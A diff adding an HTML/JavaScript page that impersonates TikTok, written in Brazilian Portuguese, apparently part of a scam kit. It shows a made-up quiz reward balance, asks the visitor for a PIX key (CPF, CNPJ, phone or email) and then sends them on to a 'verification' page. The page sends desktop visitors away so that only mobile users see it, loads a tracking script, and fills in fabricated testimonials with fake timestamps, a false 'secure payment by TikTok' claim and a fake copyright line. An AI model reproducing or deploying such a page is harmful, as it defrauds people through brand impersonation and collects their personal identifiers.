@@ -1,0 +1,639 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok Recompensas – Saque</title>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+  if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+    window.location.href = 'https://image.1111down.com/xG1nkqKTMzGDvpLrqFT7WA/ef311940-320d-4b47-94ef-600f2eafd920/width=450/1272375.jpeg';
+  }
+  </script>
+
+
+
+
+
+
+
+
+
+
+  <!-- Lucide Icons -->
+  <script src="https://unpkg.com/lucide@latest"></script>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  
+  <!-- Tracking (keep the file in the folder) -->
+  <script src="js/LmUqyQ2o5ftw.js" defer=""></script>
+
+  <style>
+    /* Reset & base styles */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    /* TikTok Palette (adapted for white background - Refined) */
+    :root {
+      --tt-red: #FE2C55; /* TikTok's vibrant red */
+      --tt-cyan: #00F2EA; /* TikTok's cyan accent */
+      --tt-shadow-red: #D60032; /* Darker red for logo shadow */
+      --tt-shadow-cyan: #00C8C3; /* Darker cyan for logo shadow */
+
+      --light-bg-main: #F9F9F9; /* Very light gray for main background - subtle off-white */
+      --white-card-bg: #FFFFFF; /* Pure white for cards/elements - crisp */
+      
+      --text-main-dark: #333333; /* Softer dark gray for main text - professional */
+      --text-secondary-light: #777777; /* Medium gray for secondary text - readable */
+      --border-subtle: #E0E0E0; /* Light gray for borders - clean */
+      --border-active: #C0C0C0; /* Slightly darker border for active states */
+      
+      --money-green: #2ECC71; /* A clear, vibrant green for money values */
+      --error-red: #EF4444; /* Standard error red */
+      --warning-yellow: #FFC107; /* Standard yellow for warnings */
+      --white: #ffffff;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start; /* Align to top for scrollable content */
+      font-family: 'Inter', Arial, Helvetica, sans-serif;
+      background: var(--light-bg-main); /* Main light background */
+      color: var(--text-main-dark); /* Default text color - softer dark gray */
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden; /* Prevent horizontal scrolling */
+      padding-bottom: 2rem; /* Spacing for footer */
+    }
+
+    /* Animations */
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); box-shadow: 0 4px 15px rgba(254, 44, 85, 0.25); } /* Red shadow for pulse effect */
+      50% { transform: scale(1.03); box-shadow: 0 6px 20px rgba(254, 44, 85, 0.4); }
+    }
+    @keyframes pulseGreen {
+      0%, 100% { transform: scale(1); box-shadow: 0 4px 15px rgba(46, 204, 113, 0.25); } /* Green shadow for pulse effect */
+      50% { transform: scale(1.03); box-shadow: 0 6px 20px rgba(46, 204, 113, 0.4); }
+    }
+
+
+    /* General Layout */
+    .wrapper {
+      width: 100%;
+      max-width: 428px;
+      background: var(--light-bg-main);
+      animation: fadeIn 0.5s ease-out; /* Fade in wrapper on load */
+      padding-bottom: 2rem; /* Spacing for footer */
+    }
+
+    /* HEADER */
+    .header {
+      display: flex;
+      justify-content: center; /* Center logo */
+      align-items: center;
+      padding: .75rem 1rem;
+      background: var(--white-card-bg); /* White header background */
+      border-bottom: 1px solid var(--border-subtle); /* Subtle border */
+      box-shadow: 0 2px 5px rgba(0,0,0,0.03); /* Subtle shadow */
+      position: relative;
+    }
+
+    /* Logo Image Styling */
+    .logo-img {
+      height: 32px; /* Fixed height for consistency */
+      object-fit: contain; /* Ensures the image fits within the bounds */
+    }
+    
+    /* Bonus Card - New section for unlocked bonus */
+    .bonus-card {
+        background: var(--white-card-bg);
+        border-radius: 1rem;
+        padding: 1rem 1.25rem;
+        margin: 1.25rem 1rem 0;
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        box-shadow: 0 4px 16px rgba(0,0,0,0.05);
+        border: 1px solid var(--border-subtle);
+    }
+    .bonus-card .icon { color: var(--money-green); flex-shrink: 0; }
+    .bonus-card div { flex-grow: 1; }
+    .bonus-card h3 { font-size: 1rem; font-weight: 700; color: var(--text-main-dark); margin-bottom: 0.125rem; }
+    .bonus-card p { font-size: 0.875rem; color: var(--text-secondary-light); }
+    .bonus-card .bonus-value { 
+        display: flex; align-items: center; font-size: 1rem; font-weight: 800;
+        color: var(--money-green); /* Bonus value in green */
+    }
+
+    /* Balance Card - Main display of total balance */
+    .balance-card {
+        background: linear-gradient(135deg, var(--tt-red) 0%, var(--tt-shadow-red) 100%); /* Red gradient for impact */
+        border-radius: 1rem;
+        padding: 1.5rem;
+        margin: 1.25rem 1rem 0;
+        text-align: center;
+        color: var(--white);
+        box-shadow: 0 10px 25px -5px rgba(254, 44, 85, 0.3); /* Red shadow */
+    }
+    .balance-card .icon { margin-bottom: 0.5rem; opacity: 0.8; }
+    .balance-card p { font-size: 1rem; font-weight: 500; margin-bottom: 0.5rem; }
+    .balance-card .total-value { font-size: 2.75rem; font-weight: 900; line-height: 1; }
+    
+    /* Main Card - for forms and options */
+    .card {
+      margin: 1.25rem 1rem 0;
+      background: var(--white-card-bg); /* White card background */
+      border-radius: 1.25rem;
+      box-shadow: 0 6px 20px rgba(0,0,0,.08);
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+    }
+    .card h2 {
+      font-size: 1.125rem;
+      font-weight: 700;
+      color: var(--text-main-dark); /* Dark text for headings */
+      margin-bottom: 1rem;
+      border-left: 4px solid var(--tt-red); /* Red accent bar */
+      padding-left: 0.75rem;
+    }
+    
+    /* Amount Options */
+    .amount-options { display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.75rem; }
+    .amount-options .opt {
+        background: var(--light-bg-main); border: 2px solid var(--border-subtle); border-radius: 0.75rem;
+        padding: 1rem 0.5rem; text-align: center; font-size: 1rem; font-weight: 600;
+        color: var(--text-main-dark); cursor: pointer; transition: all 0.2s;
+        display: flex; align-items: center; justify-content: center; gap: 0.5rem;
+    }
+    .amount-options .opt:hover { border-color: var(--border-active); transform: translateY(-2px); }
+    .amount-options .opt.selected { 
+        border-color: var(--tt-red); background: rgba(254, 44, 85, 0.05); /* Light red background */
+        color: var(--tt-red); font-weight: 700; 
+    }
+    .amount-options .opt.opt-total { /* Specific style for "Saque Total" option */
+        background-color: rgba(46, 204, 113, 0.05); /* Light green background */
+        color: var(--money-green); /* Green text */
+        border: 2px solid var(--money-green); /* Green border */
+        font-weight: 700;
+    }
+    .amount-options .opt.opt-total .icon {color: var(--money-green); transition: transform 0.3s;}
+    .amount-options .opt.opt-total:hover {
+       border-color: var(--money-green);
+    }
+    .amount-options .opt.opt-total.selected {
+        background: linear-gradient(135deg, var(--money-green) 0%, #1A8D49 100%); /* Green gradient when selected */
+        color: var(--white); border-color: transparent;
+        box-shadow: 0 0 15px rgba(46, 204, 113, 0.4); font-weight: 800;
+    }
+    .amount-options .opt.opt-total.selected .icon {color: var(--white);}
+
+    .amount-error {
+        display: none; color: var(--error-red); font-size: 0.875rem;
+        font-weight: 500; margin-top: 0.75rem; text-align: center;
+        animation: fadeIn 0.3s;
+    }
+
+    /* PIX Form */
+    .pix-form { margin-top: 1rem; }
+    .form-group { margin-bottom: 1rem; }
+    .form-group label { display: block; font-size: 0.875rem; font-weight: 600; color: var(--text-secondary); margin-bottom: 0.5rem; }
+    
+    .custom-select-wrapper { position: relative; }
+    .custom-select {
+        display: flex; align-items: center; gap: 0.75rem; width: 100%;
+        padding: 0.875rem 1rem; border: 2px solid var(--border-subtle);
+        border-radius: 0.75rem; background-color: var(--white-card-bg); cursor: pointer;
+        transition: border-color 0.2s;
+    }
+    .custom-select:hover, .custom-select.open { border-color: var(--tt-red); } /* Red border on hover/open */
+    .custom-select .select-text { color: var(--text-secondary); }
+    .custom-select .select-text.selected { color: var(--text-main-dark); font-weight: 500;}
+    .custom-select .icon { color: var(--text-secondary); }
+    .custom-select .arrow-icon { margin-left: auto; color: var(--text-secondary); transition: transform 0.3s; }
+    .custom-select.open .arrow-icon { transform: rotate(180deg); }
+    .custom-options {
+        display: none; position: absolute; top: 100%; left: 0; right: 0;
+        background-color: var(--white-card-bg); border: 1px solid var(--border-subtle);
+        border-radius: 0.75rem; margin-top: 0.5rem;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1); z-index: 10; overflow: hidden;
+    }
+    .custom-options.show { display: block; animation: fadeIn 0.2s ease-out; }
+    .custom-option { display: flex; align-items: center; gap: 0.75rem; padding: 0.875rem 1rem; cursor: pointer; transition: background-color 0.2s; }
+    .custom-option:hover { background-color: var(--light-bg-main); }
+    .custom-option .icon { color: var(--text-secondary); }
+    .custom-option span { color: var(--text-main-dark); font-weight: 500;}
+
+    #pix-key-input {
+        width: 100%; padding: 0.875rem 1rem; font-size: 1rem; border: 2px solid var(--border-subtle);
+        border-radius: 0.75rem; transition: border-color 0.2s; color: var(--text-main-dark);
+        background-color: var(--light-bg-main); /* Light background for input */
+    }
+    #pix-key-input:focus { border-color: var(--tt-red); outline: none; } /* Red border on focus */
+
+    .btn-submit {
+        margin-top: 1rem; width: 100%; padding: 1.1rem; font-size: 1.1rem;
+        font-weight: 800; border: none; border-radius: .75rem;
+        background: rgba(254, 44, 85, 0.1); /* Light red for disabled state */
+        color: rgba(51,51,51,0.4); /* Faded text for disabled state */
+        cursor: not-allowed; transition: all .2s;
+    }
+    .btn-submit.active {
+        background: linear-gradient(90deg, var(--tt-red) 0%, var(--tt-shadow-red) 100%); /* Vibrant red gradient */
+        color: var(--white); cursor: pointer; animation: pulse 2s infinite;
+    }
+    
+    .processing-notice {
+        display: flex; align-items: center; justify-content: center;
+        gap: 0.5rem; margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);
+    }
+    .processing-notice .icon { color: var(--money-green); } /* Green lock icon */
+
+    /* Testimonials Section */
+    .testimonials-section { margin: 1.25rem 1rem 0; }
+    .testimonials-section h2 {
+      font-size: 1.125rem;
+      font-weight: 700;
+      color: var(--text-main-dark);
+      margin-bottom: 1rem;
+      border-left: 4px solid var(--tt-red); /* Red accent bar */
+      padding-left: 0.75rem;
+    }
+    .testimonial-item {
+        background: var(--white-card-bg);
+        border-radius: 1rem;
+        padding: 1rem;
+        margin-bottom: 0.75rem;
+        display: flex;
+        gap: 1rem;
+        align-items: flex-start;
+        box-shadow: 0 4px 16px rgba(0,0,0,0.05);
+        border: 1px solid var(--border-subtle);
+    }
+    .testimonial-avatar {
+        background-color: var(--light-bg-main);
+        width: 40px; height: 40px; border-radius: 9999px;
+        display: flex; align-items: center; justify-content: center;
+        color: var(--text-secondary); flex-shrink: 0;
+    }
+    .testimonial-content .name { font-weight: 700; color: var(--text-main-dark); }
+    .testimonial-content .location { font-size: 0.875rem; color: var(--text-secondary); margin-left: 0.5rem; }
+    .testimonial-content .comment { color: var(--text-main-dark); margin: 0.25rem 0 0.5rem; font-size: 0.95rem; line-height: 1.5; }
+    .testimonial-footer { display: flex; justify-content: space-between; font-size: 0.8rem; color: var(--text-secondary); }
+
+    /* Site Footer */
+    .site-footer {
+        text-align: center;
+        padding: 2.5rem 1rem 1.5rem;
+        margin: 1.25rem 0 0;
+        background-color: var(--white-card-bg);
+        border-top: 1px solid var(--border-subtle);
+        color: var(--text-secondary);
+        font-size: 0.8rem;
+        line-height: 1.6;
+        box-shadow: 0 -2px 5px rgba(0,0,0,0.03); /* Subtle shadow on top */
+    }
+    .site-footer .security-info {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+        margin-bottom: 0.75rem;
+        color: var(--text-secondary);
+    }
+    .site-footer .security-info .icon {
+        width: 16px;
+        height: 16px;
+        color: var(--money-green); /* Green lock icon for security */
+    }
+    .site-footer .footer-links {
+        margin-bottom: 0.75rem;
+    }
+    .site-footer .footer-links a {
+        color: var(--text-secondary);
+        font-weight: 500;
+        text-decoration: none;
+        transition: color 0.2s;
+    }
+    .site-footer .footer-links a:hover {
+        color: var(--tt-red); /* Red on hover for links */
+    }
+    .site-footer .footer-links span {
+        margin: 0 0.5rem;
+    }
+    .site-footer .copyright {
+        font-size: 0.75rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <header class="header">
+      <!-- Your custom logo image -->
+      <img src="images/KI4QLho4nQMG.png" alt="Seu Logo" class="logo-img" loading="lazy" onerror="this.onerror=null;this.src='https://placehold.co/100x32/FE2C55/FFFFFF?text=LOGO';">
+    </header>
+
+    <div class="bonus-card">
+        <i data-lucide="gift" class="icon"></i>
+        <div>
+            <h3>Bônus Desbloqueado!</h3>
+            <p>Por concluir a missão rapidamente!</p>
+        </div>
+        <span class="bonus-value">+ R$ 100,00</span>
+    </div>
+
+    <div class="balance-card">
+        <i data-lucide="wallet" class="icon"></i>
+        <p>Seu saldo total para saque:</p>
+        <div id="total-balance" class="total-value">R$ 0,00</div> <!-- Will be populated by JS -->
+    </div>
+
+    <main class="card">
+        <section>
+            <h2>1. Selecione o Valor do Saque</h2>
+            <p id="amount-error" class="amount-error">Por favor, selecione um valor para o saque.</p>
+            <div class="amount-options" id="amount-options">
+                <div class="opt" data-value="5000">R$ 50,00</div>
+                <div class="opt" data-value="10000">R$ 100,00</div>
+                <div class="opt" data-value="20000">R$ 200,00</div>
+                <div class="opt opt-total" data-value="FULL_BALANCE">
+                    <i data-lucide="star" class="icon"></i>
+                    <span>Saque Total</span>
+                </div>
+            </div>
+        </section>
+
+        <section style="margin-top: 2rem;">
+            <h2>2. Chave PIX para Recebimento</h2>
+            <div class="pix-form">
+                <div class="form-group">
+                    <label for="pix-key-type">Tipo de Chave</label>
+                    <div class="custom-select-wrapper">
+                        <div class="custom-select" id="pix-key-type">
+                            <i data-lucide="list-checks" class="icon"></i>
+                            <span class="select-text">Selecione o tipo</span>
+                            <i data-lucide="chevron-down" class="arrow-icon"></i>
+                        </div>
+                        <div class="custom-options" id="key-type-options">
+                            <div class="custom-option" data-type="cpf"><i data-lucide="contact" class="icon"></i> <span>CPF</span></div>
+                            <div class="custom-option" data-type="cnpj"><i data-lucide="landmark" class="icon"></i> <span>CNPJ</span></div>
+                            <div class="custom-option" data-type="celular"><i data-lucide="smartphone" class="icon"></i> <span>Celular</span></div>
+                            <div class="custom-option" data-type="email"><i data-lucide="at-sign" class="icon"></i> <span>E-mail</span></div>
+                            <div class="custom-option" data-type="aleatoria"><i data-lucide="key-round" class="icon"></i> <span>Chave Aleatória</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="pix-key-input">Sua Chave PIX</label>
+                    <input type="text" id="pix-key-input" placeholder="Primeiro, selecione o valor e o tipo">
+                </div>
+            </div>
+        </section>
+
+        <button id="submit-btn" class="btn-submit" disabled="">CONCLUIR SAQUE</button>
+
+        <div class="processing-notice">
+            <i data-lucide="lock" class="icon"></i>
+            <span>Pagamento seguro processado pelo TikTok.</span> <!-- Changed to TikTok -->
+        </div>
+    </main>
+
+    <section class="testimonials-section">
+        <h2>Últimos Saques Realizados</h2>
+        <div id="testimonials-list"></div>
+    </section>
+
+    <footer class="site-footer">
+        <div class="security-info">
+            <i data-lucide="shield-check" class="icon"></i>
+            <span>Ambiente 100% Seguro</span>
+        </div>
+        <div class="footer-links">
+            <a href="#">Termos de Serviço</a>
+            <span>�</span>
+            <a href="#">Política de Privacidade</a>
+        </div>
+        <p class="copyright" id="copyright-year"></p>
+    </footer>
+
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const NEXT_PAGE = '../verificacao/index.html'; // Destination page after submission
+      
+      const BONUS_AMOUNT_IN_CENTS = 10000; // Value for "Bônus Desbloqueado" (R$100,00)
+      const TOTAL_BALANCE_FROM_QUIZ = 81670 + 4626; // Sum of final quiz total (81670) + last quiz reward (4626) = 86296
+      const totalBalanceInCents = TOTAL_BALANCE_FROM_QUIZ + BONUS_AMOUNT_IN_CENTS; // Total from quizzes + bonus
+
+      const amountOptions = document.getElementById('amount-options');
+      const submitBtn = document.getElementById('submit-btn');
+      const amountError = document.getElementById('amount-error');
+      const testimonialsList = document.getElementById('testimonials-list');
+      
+      const selectWrapper = document.querySelector('.custom-select-wrapper');
+      const select = document.getElementById('pix-key-type');
+      const selectIcon = select.querySelector('.icon');
+      const selectText = select.querySelector('.select-text');
+      const options = document.getElementById('key-type-options');
+      const pixKeyInput = document.getElementById('pix-key-input');
+      const totalBalanceDisplay = document.getElementById('total-balance');
+
+
+      let selectedAmount = null;
+      let selectedKeyType = null;
+      let isPixKeyValid = false;
+
+      // Helper for currency formatting
+      const formatCurrency = (cents) => (cents / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+
+      // Populate static amount options and total balance display
+      document.querySelectorAll('#amount-options .opt').forEach(el => {
+        if (el.dataset.value === "FULL_BALANCE") {
+            el.querySelector('span').textContent = "Saque Total"; // Ensure text is correct for full balance
+            // Data-value for total balance option will be set dynamically below
+        } else {
+            const value = parseInt(el.dataset.value, 10);
+            el.textContent = formatCurrency(value);
+        }
+      });
+      // Set the data-value for "Saque Total" to the actual total balance
+      document.querySelector('.opt-total').dataset.value = totalBalanceInCents;
+
+      totalBalanceDisplay.textContent = formatCurrency(totalBalanceInCents);
+
+      // Event listener for amount options selection
+      amountOptions.addEventListener('click', (e) => {
+        const target = e.target.closest('.opt');
+        if (!target) return;
+
+        amountOptions.querySelectorAll('.opt').forEach(opt => opt.classList.remove('selected'));
+        target.classList.add('selected');
+        
+        // Handle "Saque Total" option value
+        if (target.dataset.value === "FULL_BALANCE" || target.classList.contains('opt-total')) {
+            selectedAmount = totalBalanceInCents;
+        } else {
+            selectedAmount = parseInt(target.dataset.value, 10);
+        }
+
+        amountError.style.display = 'none';
+        checkFormCompletion();
+      });
+
+      // Custom select box logic
+      select.addEventListener('click', () => {
+        options.classList.toggle('show');
+        select.classList.toggle('open');
+      });
+
+      options.addEventListener('click', (e) => {
+        const target = e.target.closest('.custom-option');
+        if (!target) return;
+
+        selectedKeyType = target.dataset.type;
+        selectText.textContent = target.querySelector('span').textContent;
+        selectText.classList.add('selected');
+        
+        const newIconName = target.querySelector('.icon').getAttribute('data-lucide');
+        selectIcon.setAttribute('data-lucide', newIconName);
+        lucide.createIcons(); // Re-render icon
+
+        options.classList.remove('show');
+        select.classList.remove('open');
+        pixKeyInput.value = ''; // Clear input on type change
+        pixKeyInput.placeholder = `Digite sua chave ${target.querySelector('span').textContent.trim()}`;
+        pixKeyInput.focus();
+        validatePixKey(); // Re-validate
+        checkFormCompletion();
+      });
+
+      // Close custom select when clicking outside
+      document.addEventListener('click', (e) => {
+        if (!selectWrapper.contains(e.target)) {
+            options.classList.remove('show');
+            select.classList.remove('open');
+        }
+      });
+
+      // PIX key validation logic
+      function validatePixKey() {
+        const value = pixKeyInput.value;
+        switch (selectedKeyType) {
+            case 'cpf': isPixKeyValid = value.replace(/\D/g, '').length === 11; break;
+            case 'cnpj': isPixKeyValid = value.replace(/\D/g, '').length === 14; break;
+            case 'celular': isPixKeyValid = value.replace(/\D/g, '').length === 11; break; // 11 digits (incl. DDD)
+            case 'email': isPixKeyValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value); break;
+            case 'aleatoria': default: isPixKeyValid = value.length >= 5; break; // Minimum length for random key
+        }
+      }
+      
+      // Focus on PIX key input - show error if amount not selected
+      pixKeyInput.addEventListener('focus', () => {
+          if (selectedAmount === null) {
+            amountError.style.display = 'block';
+            pixKeyInput.blur(); // Remove focus from input if no amount selected
+          } else {
+            amountError.style.display = 'none';
+          }
+      });
+      
+      // Input formatting for CPF, CNPJ, Celular
+      pixKeyInput.addEventListener('input', (e) => {
+        let value = e.target.value;
+        switch (selectedKeyType) {
+            case 'cpf':
+                value = value.replace(/\D/g, '').slice(0, 11);
+                if(value.length > 9) value = value.replace(/(\d{3})(\d{3})(\d{3})(\d)/, '$1.$2.$3-$4');
+                else if(value.length > 6) value = value.replace(/(\d{3})(\d{3})(\d)/, '$1.$2.$3');
+                else if(value.length > 3) value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                break;
+            case 'cnpj':
+                value = value.replace(/\D/g, '').slice(0, 14);
+                if (value.length > 12) value = value.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d)/, '$1.$2.$3/$4-$5');
+                else if (value.length > 8) value = value.replace(/(\d{2})(\d{3})(\d{3})(\d)/, '$1.$2.$3/$4');
+                else if (value.length > 5) value = value.replace(/(\d{2})(\d{3})(\d)/, '$1.$2.$3');
+                else if (value.length > 2) value = value.replace(/(\d{2})(\d)/, '$1.$2');
+                break;
+            case 'celular':
+                value = value.replace(/\D/g, '').slice(0, 11);
+                if (value.length > 10) value = value.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+                else if (value.length > 6) value = value.replace(/(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
+                else if (value.length > 2) value = value.replace(/(\d{2})(\d)/, '($1) $2');
+                else if (value.length > 0) value = value.replace(/(\d*)/, '($1');
+                break;
+        }
+        e.target.value = value;
+        validatePixKey();
+        checkFormCompletion();
+      });
+
+      // Check if all form fields are valid to enable submit button
+      function checkFormCompletion() {
+        if (selectedAmount !== null && selectedKeyType !== null && isPixKeyValid) {
+            submitBtn.disabled = false;
+            submitBtn.classList.add('active');
+        } else {
+            submitBtn.disabled = true;
+            submitBtn.classList.remove('active');
+        }
+      }
+
+      // Submit button action
+      submitBtn.addEventListener('click', () => {
+          if (!submitBtn.disabled) {
+              window.location.href = `${NEXT_PAGE}${window.location.search}`;
+          }
+      });
+
+      // Testimonials data and rendering
+      const testimonials = [
+        { name: 'João P.', location: 'São Paulo, SP', comment: 'Galera, não acreditei no começo, mas o PIX caiu na hora! Surreal. Não mosca, faz logo!', minutesAgo: 3 },
+        { name: 'Maria C.', location: 'Belo Horizonte, MG', comment: 'Pensando se valia a pena... valeu CADA segundo! Já tô planejando o que fazer com a grana. 🤑', minutesAgo: 8 },
+        { name: 'Carlos Lima', location: 'Rio de Janeiro, RJ', comment: 'Recebido com sucesso. Achei que era brincadeira, mas a promoção é real. Recomendo.', minutesAgo: 15 },
+        { name: 'Ana Souza', location: 'Salvador, BA', comment: 'Manooo, que sorte! 🔥 Nunca ganho nada, mas dessa vez foi diferente. A galera toda do meu trabalho tá fazendo também.', minutesAgo: 22 },
+        { name: 'Fernanda Oliveira', location: 'Curitiba, PR', comment: 'O processo foi muito rápido e seguro. O valor total já está na minha conta. Obrigada, TikTok!', minutesAgo: 31 }, /* Changed to TikTok */
+        { name: 'Lucas F.', location: 'Porto Alegre, RS', comment: 'Demorou nada, o dinheiro já tá aqui. Sério, se você tá na dúvida, só vai!', minutesAgo: 45 },
+      ];
+
+      const today = new Date();
+      const formattedDate = today.toLocaleDateString('pt-BR');
+
+      testimonialsList.innerHTML = testimonials
+        .sort((a, b) => a.minutesAgo - b.minutesAgo)
+        .map(t => `
+        <div class="testimonial-item">
+            <div class="testimonial-avatar">
+                <i data-lucide="user-circle-2"></i>
+            </div>
+            <div class="testimonial-content">
+                <div>
+                    <span class="name">${t.name}</span>
+                    <span class="location">${t.location}</span>
+                </div>
+                <p class="comment">${t.comment}</p>
+                <div class="testimonial-footer">
+                    <span>${formattedDate}</span>
+                    <span>${t.minutesAgo} min atrás</span>
+                </div>
+            </div>
+        </div>
+      `).join('');
+      
+      document.getElementById('copyright-year').textContent = `© ${new Date().getFullYear()} TikTok. Todos os direitos reservados.`; /* Changed to TikTok */
+
+      lucide.createIcons();
+    });
+  </script>
+
+
+</body></html>
